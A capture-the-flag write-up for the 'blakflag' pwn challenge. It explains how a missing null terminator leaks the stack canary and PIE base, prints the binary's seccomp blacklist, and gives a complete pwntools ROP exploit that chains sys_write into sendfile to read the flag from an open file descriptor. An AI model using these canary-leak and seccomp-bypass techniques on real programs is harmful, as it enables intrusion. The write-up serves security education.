# blakflag
### TL;DR
The original description hinted that you have to leak the flag.

`pwn, seccomp, guess`

`nc blakflag-01.pwn.beer 45243`

[binary](./chall) (`stripped`, `x64`)

* Can leak PIE and Canary -> ROP
* Seccomp blacklist
* Flag file descriptor never closed
    * `sys_sendfile` not blacklisted but need to set `rax=0x28`
    * `sys_write` gadget available and not blacklisted
        * Set `rax=0x28` using return value from `sys_write`

**SECT{bL4cKlIs7S_4Re_A_r1skY_b1znaS}**

## Walkthrough

This was a fun challenge in ROP and seccomp where you had three attempts at "guessing the flag" to the given binary:

```
$ ./chall 

 ▄█████████▄ ▄███        ▄▄████████▄ ▄███  ▄█████ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ████▀▀▀████ ████        ████▀▀▀████ ████▄█████▀▀  ▄▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ████▄▄▄███▀ ████        ████▄▄▄████ ████████▀▀    ▀▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ████▀▀▀███▄ ████        ████▀▀▀████ █████████▄     ▄▄▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ████▄▄▄████ ████▄▄▄▄▄▄▄ ████   ████ ████▀▀█████▄    ▄ ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ██████████▀ ███████████ ████   ████ ████  ▀▀████    ▀▄ ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀ ▀▀▀▀    ▀▀▀▀     ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄█████████ ▄███        ▄▄████████▄ ▄▄█████████      ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ████▀▀▀▀▀▀▀ ████        ████▀▀▀████ ████▀▀▀▀▀▀▀      ▀▄▄▄▄▀    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
 ████▄▄▄     ████        ████▄▄▄████ ████ ▄▄▄▄▄        ▄▄▀      ▀▀▀▀▀▀▀▀▀▀▀▄▄▄▄ 
 ████▀▀▀     ████        ████▀▀▀████ ████ ▀▀████        ▄▄                   ▀▀ 
 ████        ████▄▄▄▄▄▄▄ ████   ████ ████▄▄▄████         ▄
 ████        ███████████ ████   ████ ▀█████████▀         ▀▄
 ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀           ▄

flag (1/3): asd
it is not asd
flag (2/3): asd
it is not asd
flag (3/3): asd
it is not asd
```

(The binary reads the real flag from `/home/ctf/flag`)

Normal security options are enabled. Even though the output below says stack canaries are disabled, **the binary does check a canary**.
```
>>> ELF('./chall')
[!] Did not find any GOT entries
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Poking around, we see **the binary fails to null-terminate our input** and thus **leaks information**. We also trigger a stack buffer overflow:
```
flag (1/3): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
it is not AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#OJ�GN�gm>V
flag (2/3): asd
it is not asd
flag (3/3): asd
it is not asd
*** stack smashing detected ***: <unknown> terminated
```

Interestingly enough, the stack smashing is not called until after our third guess. Perhaps we can **leak the canary in our first attempts, bypass the check and start to ROP!** After some debugging, we find that the `canary` followed by a `PIE` address lies at a 152 bytes offset from our input. 

```python
#!/usr/bin/python2

from pwn import *

p = process('./chall')
#p = remote('blakflag-01.pwn.beer', 45243)

with context.quiet:
    # Leak pie and canary (1)
    padding = "A"*152
    p.sendlineafter("flag (1/3): ", padding)
    p.recvuntil("it is not " + padding + "\n")
    leak = p.recvline()
    canary = u64(leak[0:7].rjust(8, chr(0x0)))
    pie = u64(leak[7:-1].ljust(8, chr(0x0))) - 0xf1e
    print "Got canary: %s" % hex(canary)
    print "Got pie: %s" % hex(pie)
```

```
$ ./exploit.py 
[+] Starting local process './chall': pid 19026
Got canary: 0xe5cdcf1bb16d0800
Got pie: 0x555e0b4c6000
```

Great, we can now control `rip`!

### seccomp
The binary used `seccomp` to **blacklist certain syscalls**:
<details><summary>

`read`, `open`, `mmap`, `mprotect`, `clone`, `fork`, `vfork`, `execve`,`creat`, `openat`, `execveat`.
</summary>
<p>

```
$ seccomp-tools dump ./chall
...
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0022
 0021: 0x06 0x00 0x00 0x00000000  return KILL
 0022: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0024
 0023: 0x06 0x00 0x00 0x00000000  return KILL
 0024: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0026
 0025: 0x06 0x00 0x00 0x00000000  return KILL
 0026: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0028
 0027: 0x06 0x00 0x00 0x00000000  return KILL
 0028: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

</p>
</details>

Even though seccomp is enabled using `prctl` instead of using a lib, it makes sure to blacklist some known bypasses, such as [calling `0x40000002` instead of `0x00000002`](https://ctftime.org/task/8059) or changing the architecture during runtime.

*Shoutout to [seccomp-tools](https://github.com/david942j/seccomp-tools), a great utility!*

We notice some things here:
* `execve` etc. is disabled, meaning we are probably not supposed to spawn a shell
    * The challenge description also hinted that you're supposed to just leak the flag.
* `write` isn't blacklisted.

### ROP/recon
Recall that rdi, rsi, rdx, r10, ... are used for syscalls. We find some very neat gadgets:
```
pop r10 ; pop rdx ; pop rdi ; pop rsi ; ret <- neat!
xor rax, rax ; mov al, 1 ; syscall ; ret <- sys_write
```

So here we start googling around on how to read a file despite `seccomp` blacklists. Around the same time we also realize that **the binary never closes the flag file descriptor**. We stumble upon [this page](https://github.com/unixist/seccomp-bypass) and learn that we can use `sys_sendfile` to send data from one file descriptor to another.

But we have no gadget to set `rax` to `0x28` reliably... *Or do we?*

### Solution
After sitting in frustration for a while we remember a common behaviour from `read/write` functions: **The amount of bytes read/written are stored in the return value (`rax`)!** 

`exploit.py`

```python
#!/usr/bin/python2

from pwn import *

p = process('./chall')
#p = remote('blakflag-01.pwn.beer', 45243)

with context.quiet:
    # Leak pie and canary (1)
    padding = "A"*152
    p.sendlineafter("flag (1/3): ", padding)
    p.recvuntil("it is not " + padding + "\n")
    leak = p.recvline()
    canary = u64(leak[0:7].rjust(8, chr(0x0)))
    pie = u64(leak[7:-1].ljust(8, chr(0x0))) - 0xf1e
    print "Got canary: %s" % hex(canary)
    print "Got pie: %s" % hex(pie)

    # Place ropchain (2)
    start = pie + 0xe3a
    pop_rdx_rdi_rsi = pie + 0x0000000000000f93
    syscall_write = pie + 0x0000000000000f54
    pop_r10_rdx_rdi_rsi = pie+0x0000000000000f91
    arb_syscall = pie + 0x0000000000000f50

    p.sendlineafter("flag (2/3): ", 
        padding +
        p64(canary) + 
        ("A"*8)+
        p64(pop_rdx_rdi_rsi) +
        p64(0x28) + p64(0x2) + p64(start) +         # sys_write: Write 0x28 bytes from pointer ("start") to stderr
        p64(syscall_write) +                        # Return value (rax) is set to 0x28 
        p64(pop_r10_rdx_rdi_rsi) + 
        p64(0x40) + p64(0x0) + p64(0x1) + p64(0x3)+ # sys_sendfile: Copy 0x40 bytes from flag fd to stdout, with offset set to NULL
        p64(arb_syscall)                            # Give flag plz!
    )   

    # Use up the last attempt (3) -> trigger ropchain
    p.sendlineafter("flag (3/3): ", "Lol")
        
    p.recvuntil("SECT")
    print "SECT%s" % p.recvline()
```

```
$ ./exploit.py 
Got canary: 0x48828f9b108c7c00
Got pie: 0x55eb9c72b000
SECT{bL4cKlIs7S_4Re_A_r1skY_b1znaS}
```
